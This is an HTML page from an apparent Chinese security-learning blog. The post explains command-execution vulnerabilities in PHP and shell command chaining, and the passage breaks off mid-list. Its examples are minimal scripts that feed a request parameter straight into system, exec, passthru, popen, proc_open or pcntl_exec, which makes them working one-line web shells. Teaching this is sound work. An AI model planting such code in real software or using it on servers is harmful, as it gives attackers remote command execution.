@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiexf">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/08/23/web安全/命令执行/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="0x01 介绍命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：**system()、exec()、shell_exec()、eval()、passthru()**，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。 0x02 原理用户输入的数据被当做系统命令执行 0x03 系统命令函数system1system (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="http://example.com/2023/08/23/Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x01 介绍命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：**system()、exec()、shell_exec()、eval()、passthru()**，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。 0x02 原理用户输入的数据被当做系统命令执行 0x03 系统命令函数system1system (">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-08-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-19T07:10:43.543Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            命令执行 -
+        
+        Chiexf&#39;blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Chiexf' Blog","subtitle":{"text":["好好学习，天天向上！！！","CTRL + CV player~"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Chiexf","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.3.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"path":"/about","icon":"fa-regular fa-user"}},"search":{"enable":true,"preload":false}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"info","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+    
+
+    
+
+    <div class="main-content-container">
+        
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiexf&#39;blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                        标签
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        分类
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/about"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/tags"  >
+                             
+                                
+                                标签
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                分类
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/about"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">命令执行</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Chiexf</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-08-23</span>
+        <span class="mobile">2023-08-23</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-19 15:10:43</span>
+            <span class="mobile">2023-10-19 15:10:43</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：**system()、exec()、shell_exec()、eval()、passthru()**，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p>
+<h1 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h1><p>用户输入的数据被当做系统命令执行</p>
+<h1 id="0x03-系统命令函数"><a href="#0x03-系统命令函数" class="headerlink" title="0x03 系统命令函数"></a>0x03 系统命令函数</h1><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><strong>$command</strong>为执行的命令</li>
+<li><strong>&amp;return_var</strong>可选，用来存放命令执行后的状态码</li>
+<li><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] )</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$command</code>为要执行的命令。</li>
+<li><code>$output</code>是获得执行命令输出的每一行字符串</li>
+<li><code>$return_var</code>用来保存命令执行的状态码（检测成功或失败）</li>
+<li><code>exec()</code>函数执行无回显，默认返回最后一行结果</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">Array ( [0] =&gt; uid=1000(www) gid=1000(www) groups=1000(www) )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>和<code>system函数</code>类似，<code>$command</code>为执行的命令</li>
+<li><code>&amp;return_var</code>可选，用来存放命令执行后的状态码</li>
+<li><code>passthru</code>函数执行有回显，将执行结果输出到页面上</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>与反引号**(&#96;)**类似</li>
+<li><code>$command</code>为执行的命令</li>
+<li><code>shell_exec()</code>函数默认无回显，通过 <code>echo</code>可将执行结果输出到页面</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`要执行的命令`</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span> ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> )</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$command</code>为执行的命令</li>
+<li><code>$mode</code>指针文件的连接模式，<code>r</code>表示阅读，<code>w</code>表示写入</li>
+<li><code>popen()</code>函数不会直接返回执行结果，而是返回一个文件指针。</li>
+<li>此指针可以用于<code>fgets()</code>，<code>fgetss()</code>和 <code>fwrite()</code>。</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$ben</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$cmd</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$ben</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=10129325 gid=10129325 groups=10129325</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$command</span> , </span><br><span class="line">	<span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line">	<span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$command</code>为执行的命令</li>
+<li><code>$descriptorspec</code>定义要创建的进程的输入、输出和错误流的规范</li>
+<li><code>$pipes</code>一个引用变量，用于存储与进程通信管道，调用数组内容。</li>
+</ul>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入</span></span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容</span></span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;/tmp/error-output.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)    <span class="comment">//标准输出错误</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$cmd</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">?cmd = id</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">uid=1000(www) gid=1000(www) groups=1000(www)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pcntl-php"><a href="#pcntl-php" class="headerlink" title="pcntl.php"></a>pcntl.php</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	pcntl_exec(&quot;/bin/bash&quot;,array($_POST[&quot;cmd&quot;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="0x04-操作系统链接符"><a href="#0x04-操作系统链接符" class="headerlink" title="0x04 操作系统链接符"></a>0x04 操作系统链接符</h1><p><strong>；</strong></p>
+<ul>
+<li>使多个命令按顺序执行</li>
+<li>前面的命令和命令都会执行，相互之间不影响</li>
+</ul>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>;<span class="built_in">ls</span>;<span class="built_in">pwd</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>&amp;</strong></p>
+<ul>
+<li>使命令在后台执行，这样就可以同时执行多条命令</li>
+<li>无论命令为真或假，都执行</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&amp;ls&amp;pwd</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>&amp;&amp;</strong></p>
+<ul>
+<li>前面的命令执行成功则执行后面的命令</li>
+</ul>
